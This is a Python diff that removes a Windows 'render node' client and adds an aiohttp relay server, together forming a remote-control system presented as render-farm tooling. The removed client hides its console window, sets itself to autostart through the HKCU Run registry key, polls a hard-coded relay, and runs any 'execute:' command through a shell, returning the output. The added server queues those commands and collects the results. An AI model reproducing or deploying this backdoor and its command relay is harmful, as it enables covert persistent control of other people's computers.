@@ -1,270 +1,286 @@
-import subprocess
-import sys
-import os
-import time
-import threading
+#!/usr/bin/env python3
+"""
+Koyeb-Compatible Relay Server - Pure HTTP
+"""
+from aiohttp import web
 import json
-import winreg
-from pathlib import Path
-import platform
-import uuid
-import requests
+import logging
+import os
 from datetime import datetime
+import uuid
+import asyncio
 
-class HTTPRenderNode:
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(message)s')
+logger = logging.getLogger("KoyebRelay")
+
+class KoyebRelay:
     def __init__(self):
-        # Cloud relay configuration
-        self.relay_config = {
-            'relay_url': 'https://mathematical-judy-bageltigerstudeos-3479b0db.koyeb.app',
-            'heartbeat_interval': 30,
-            'reconnect_delay': 5
-        }
+        self.controllers = {}
+        self.nodes = {}
+        self.command_queues = {}
+        self.responses = {}
+        self.heartbeat_timeout = 60
         
-        self.config = {
-            'render_app': r'C:\Path\To\Your\Renderer.exe',
-            'work_dir': r'C:\render_farm\work',
-            'max_restarts': 9999,
-            'restart_delay': 5
-        }
-        
-        # Setup directories
-        Path(self.config['work_dir']).mkdir(parents=True, exist_ok=True)
-        
-        # State management
-        self.restart_count = 0
-        self.is_running = True
-        self.current_process = None
-        self.node_id = None
-        
-        # Get node identity
-        self.node_info = self.get_node_identity()
-        
-        # Setup auto-start
-        self.setup_autostart()
-        
-        print(f"☁️  HTTP Render Node '{self.node_info['node_name']}' starting...")
-        print(f"   Relay: {self.relay_config['relay_url']}")
-        
-    def get_node_identity(self):
-        """Get or create this node's identity"""
-        identity_file = Path('node_identity.json')
-        if identity_file.exists():
-            try:
-                with open(identity_file, 'r') as f:
-                    return json.load(f)
-            except:
-                pass
-        
-        computer_name = platform.node()
-        identity = {
-            'node_name': f"Node-{computer_name}",
-            'computer_name': computer_name,
-            'system_type': 'render_node',
-            'version': '1.0'
-        }
-        
+    async def handle_register_controller(self, request):
+        """Register a new controller"""
         try:
-            with open(identity_file, 'w') as f:
-                json.dump(identity, f, indent=2)
-        except:
-            pass
+            controller_id = str(uuid.uuid4())
             
-        return identity
-
-    def register_with_relay(self):
-        """Register this node with the cloud relay"""
+            self.controllers[controller_id] = {
+                'id': controller_id,
+                'registered_at': datetime.utcnow().isoformat() + 'Z',
+                'last_seen': datetime.utcnow().isoformat() + 'Z'
+            }
+            
+            logger.info(f"Controller registered: {controller_id}")
+            
+            return web.json_response({
+                'controller_id': controller_id,
+                'nodes': list(self.nodes.values()),
+                'message': 'Controller registered successfully'
+            })
+            
+        except Exception as e:
+            logger.error(f"Controller registration error: {e}")
+            return web.json_response({'error': str(e)}, status=400)
+    
+    async def handle_register_node(self, request):
+        """Register a new node"""
         try:
-            response = requests.post(
-                f"{self.relay_config['relay_url']}/node/register",
-                json={
-                    'node_name': self.node_info['node_name'],
-                    'computer_name': self.node_info['computer_name'],
-                    'system_info': {
-                        'os': platform.system(),
-                        'processor': platform.processor()
-                    }
-                },
-                timeout=10
-            )
+            data = await request.json()
+            node_id = str(uuid.uuid4())
+            node_name = data.get('node_name', f'node-{node_id[:8]}')
             
-            if response.status_code == 200:
-                data = response.json()
-                self.node_id = data.get('node_id')
-                print(f"✅ Registered with relay. Node ID: {self.node_id}")
-                return True
+            self.nodes[node_id] = {
+                'node_id': node_id,
+                'node_name': node_name,
+                'computer_name': data.get('computer_name', 'Unknown'),
+                'status': 'online',
+                'registered_at': datetime.utcnow().isoformat() + 'Z',
+                'last_heartbeat': datetime.utcnow().isoformat() + 'Z'
+            }
+            
+            self.command_queues[node_id] = []
+            
+            logger.info(f"Node registered: {node_name}")
+            
+            return web.json_response({
+                'node_id': node_id,
+                'message': 'Node registered successfully'
+            })
+            
+        except Exception as e:
+            logger.error(f"Node registration error: {e}")
+            return web.json_response({'error': str(e)}, status=400)
+    
+    async def handle_node_heartbeat(self, request):
+        """Handle node heartbeat and return pending commands"""
+        try:
+            data = await request.json()
+            node_id = data.get('node_id')
+            
+            if not node_id:
+                return web.json_response({'error': 'node_id required'}, status=400)
+            
+            if node_id in self.nodes:
+                self.nodes[node_id]['last_heartbeat'] = datetime.utcnow().isoformat() + 'Z'
+                self.nodes[node_id]['status'] = 'online'
+                
+                commands = []
+                if node_id in self.command_queues:
+                    commands = self.command_queues[node_id].copy()
+                    self.command_queues[node_id] = []
+                
+                logger.info(f"Heartbeat from {self.nodes[node_id]['node_name']} - {len(commands)} commands")
+                
+                return web.json_response({
+                    'commands': commands,
+                    'message': 'Heartbeat received'
+                })
             else:
-                print(f"❌ Registration failed: {response.text}")
-                return False
+                return web.json_response({'error': 'Node not found'}, status=404)
                 
         except Exception as e:
-            print(f"❌ Registration error: {e}")
-            return False
-
-    def send_heartbeat(self):
-        """Send heartbeat and check for commands"""
-        if not self.node_id:
-            return []
-            
+            logger.error(f"Heartbeat error: {e}")
+            return web.json_response({'error': str(e)}, status=400)
+    
+    async def handle_send_command(self, request):
+        """Send command to a node"""
         try:
-            response = requests.post(
-                f"{self.relay_config['relay_url']}/node/heartbeat",
-                json={'node_id': self.node_id},
-                timeout=10
-            )
+            data = await request.json()
+            node_name = data.get('node_name')
+            command = data.get('command')
+            command_id = data.get('command_id', str(uuid.uuid4()))
             
-            if response.status_code == 200:
-                data = response.json()
-                return data.get('commands', [])
-            else:
-                print(f"❌ Heartbeat failed: {response.text}")
-                return []
-                
-        except Exception as e:
-            print(f"❌ Heartbeat error: {e}")
-            return []
-
-    def send_command_response(self, command_id, response):
-        """Send command response back to relay"""
-        try:
-            requests.post(
-                f"{self.relay_config['relay_url']}/command/response",
-                json={
+            if not node_name or not command:
+                return web.json_response({'error': 'node_name and command required'}, status=400)
+            
+            target_node_id = None
+            for node_id, node_info in self.nodes.items():
+                if node_info['node_name'] == node_name:
+                    target_node_id = node_id
+                    break
+            
+            if target_node_id:
+                command_data = {
                     'command_id': command_id,
-                    'response': response
-                },
-                timeout=10
-            )
-        except Exception as e:
-            print(f"❌ Response send error: {e}")
-
-    def handle_command(self, command):
-        """Execute commands and return output"""
-        try:
-            if command == 'status':
-                return {
-                    'status': 'running', 
-                    'restarts': self.restart_count,
-                    'renderer_running': self.current_process and self.current_process.poll() is None
+                    'command': command,
+                    'sent_at': datetime.utcnow().isoformat() + 'Z'
                 }
-            
-            elif command == 'stop':
-                self.is_running = False
-                if self.current_process:
-                    self.current_process.terminate()
-                return {'status': 'shutting_down'}
-            
-            elif command.startswith('execute:'):
-                cmd = command[8:]
-                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
-                return {
-                    'returncode': result.returncode,
-                    'stdout': result.stdout,
-                    'stderr': result.stderr
-                }
-            
-            elif command == 'restart_renderer':
-                if self.current_process:
-                    self.current_process.terminate()
-                return {'status': 'renderer_restarting'}
-            
+                
+                self.command_queues[target_node_id].append(command_data)
+                
+                logger.info(f"Command queued for {node_name}: {command}")
+                
+                return web.json_response({
+                    'command_id': command_id,
+                    'status': 'queued',
+                    'message': f'Command queued for {node_name}'
+                })
             else:
-                return {'error': f'Unknown command: {command}'}
+                return web.json_response({
+                    'error': f'Node {node_name} not found'
+                }, status=404)
                 
         except Exception as e:
-            return {'error': str(e)}
-
-    def process_commands(self, commands):
-        """Process received commands"""
-        for command_data in commands:
-            command_id = command_data.get('command_id')
-            command = command_data.get('command')
-            
-            print(f"📨 Received command: {command}")
-            
-            # Execute command
-            response = self.handle_command(command)
-            
-            # Send response back
-            self.send_command_response(command_id, response)
-
-    def run_renderer(self):
-        """Run the renderer application"""
+            logger.error(f"Send command error: {e}")
+            return web.json_response({'error': str(e)}, status=400)
+    
+    async def handle_command_response(self, request):
+        """Receive command response from node"""
         try:
-            self.current_process = subprocess.Popen(
-                [self.config['render_app'], self.config['work_dir']],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
-            )
-            return self.current_process.wait()
+            data = await request.json()
+            command_id = data.get('command_id')
+            response = data.get('response', {})
+            
+            if not command_id:
+                return web.json_response({'error': 'command_id required'}, status=400)
+            
+            self.responses[command_id] = {
+                'response': response,
+                'received_at': datetime.utcnow().isoformat() + 'Z'
+            }
+            
+            logger.info(f"Response received for command {command_id}")
+            
+            return web.json_response({'status': 'received'})
+            
         except Exception as e:
-            print(f"Renderer error: {e}")
-            return 1
-
-    def start_heartbeat_loop(self):
-        """Start the heartbeat and command processing loop"""
-        def heartbeat_loop():
-            while self.is_running:
-                try:
-                    # Send heartbeat and get commands
-                    commands = self.send_heartbeat()
-                    
-                    # Process any received commands
-                    if commands:
-                        self.process_commands(commands)
-                        
-                except Exception as e:
-                    print(f"❌ Heartbeat loop error: {e}")
-                
-                time.sleep(self.relay_config['heartbeat_interval'])
-        
-        thread = threading.Thread(target=heartbeat_loop, daemon=True)
-        thread.start()
-
-    def start(self):
-        """Main execution loop"""
-        print("Starting HTTP render node...")
-        
-        # Register with relay
-        if not self.register_with_relay():
-            print("❌ Failed to register with relay. Retrying in background...")
-            # Continue anyway, will retry registration in heartbeat
-        
-        # Start heartbeat loop
-        self.start_heartbeat_loop()
-        
-        # Main render loop
-        while self.is_running and self.restart_count < self.config['max_restarts']:
-            self.restart_count += 1
-            print(f"Render restart #{self.restart_count}")
-            
-            exit_code = self.run_renderer()
-            
-            if not self.is_running:
-                break
-                
-            print(f"Renderer exited with code {exit_code}, restarting in {self.config['restart_delay']}s...")
-            time.sleep(self.config['restart_delay'])
-        
-        print("HTTP render node shutting down")
-
-    def setup_autostart(self):
-        """Register for auto-start without admin rights"""
+            logger.error(f"Command response error: {e}")
+            return web.json_response({'error': str(e)}, status=400)
+    
+    async def handle_get_response(self, request):
+        """Get command response"""
         try:
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
-                winreg.SetValueEx(reg_key, "HTTPRenderNode", 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(__file__)}"')
-            print("Auto-start configured successfully")
+            command_id = request.query.get('command_id')
+            
+            if not command_id:
+                return web.json_response({'error': 'command_id required'}, status=400)
+            
+            if command_id in self.responses:
+                response = self.responses[command_id]
+                return web.json_response(response)
+            else:
+                return web.json_response({
+                    'error': 'Response not found'
+                }, status=404)
+                
         except Exception as e:
-            print(f"Auto-start configuration failed: {e}")
+            logger.error(f"Get response error: {e}")
+            return web.json_response({'error': str(e)}, status=400)
+    
+    async def handle_list_nodes(self, request):
+        """List all connected nodes"""
+        try:
+            current_time = datetime.utcnow()
+            inactive_nodes = []
+            
+            for node_id, node_info in self.nodes.items():
+                last_heartbeat = datetime.fromisoformat(node_info['last_heartbeat'].replace('Z', '+00:00'))
+                if (current_time - last_heartbeat).total_seconds() > self.heartbeat_timeout:
+                    inactive_nodes.append(node_id)
+                    logger.info(f"Node marked offline: {node_info['node_name']}")
+            
+            for node_id in inactive_nodes:
+                self.nodes[node_id]['status'] = 'offline'
+            
+            return web.json_response({
+                'nodes': list(self.nodes.values()),
+                'total': len(self.nodes),
+                'online': len([n for n in self.nodes.values() if n.get('status') == 'online'])
+            })
+            
+        except Exception as e:
+            logger.error(f"List nodes error: {e}")
+            return web.json_response({'error': str(e)}, status=400)
+    
+    async def handle_health(self, request):
+        """Health check endpoint"""
+        return web.json_response({
+            'status': 'healthy',
+            'service': 'render-farm-relay',
+            'timestamp': datetime.utcnow().isoformat() + 'Z',
+            'stats': {
+                'nodes_connected': len(self.nodes),
+                'nodes_online': len([n for n in self.nodes.values() if n.get('status') == 'online']),
+                'controllers_connected': len(self.controllers),
+                'pending_commands': sum(len(q) for q in self.command_queues.values())
+            }
+        })
+    
+    async def handle_root(self, request):
+        """Root endpoint"""
+        return web.json_response({
+            'message': 'Render Farm Relay Server',
+            'status': 'running',
+            'endpoints': {
+                'GET /health': 'Health check',
+                'POST /controller/register': 'Register controller',
+                'POST /node/register': 'Register node',
+                'POST /node/heartbeat': 'Node heartbeat',
+                'POST /command/send': 'Send command',
+                'POST /command/response': 'Submit response',
+                'GET /command/response': 'Get response',
+                'GET /nodes': 'List nodes'
+            }
+        })
+
+async def create_app():
+    """Create aiohttp application"""
+    app = web.Application()
+    relay = KoyebRelay()
+    
+    app['relay'] = relay
+    
+    # Add routes
+    app.router.add_get('/', relay.handle_root)
+    app.router.add_get('/health', relay.handle_health)
+    app.router.add_post('/controller/register', relay.handle_register_controller)
+    app.router.add_post('/node/register', relay.handle_register_node)
+    app.router.add_post('/node/heartbeat', relay.handle_node_heartbeat)
+    app.router.add_post('/command/send', relay.handle_send_command)
+    app.router.add_post('/command/response', relay.handle_command_response)
+    app.router.add_get('/command/response', relay.handle_get_response)
+    app.router.add_get('/nodes', relay.handle_list_nodes)
+    
+    return app
+
+async def main():
+    """Main application entry point"""
+    port = int(os.getenv('PORT', 8000))
+    
+    app = await create_app()
+    runner = web.AppRunner(app)
+    await runner.setup()
+    
+    site = web.TCPSite(runner, '0.0.0.0', port)
+    await site.start()
+    
+    logger.info(f"🚀 Koyeb Relay Server running on port {port}")
+    logger.info("💚 Ready for controllers and nodes!")
+    
+    await asyncio.Future()
 
 if __name__ == "__main__":
-    # Hide console window
-    try:
-        import ctypes
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-    except:
-        pass
-    
-    node = HTTPRenderNode()
-    node.start()
+    asyncio.run(main())
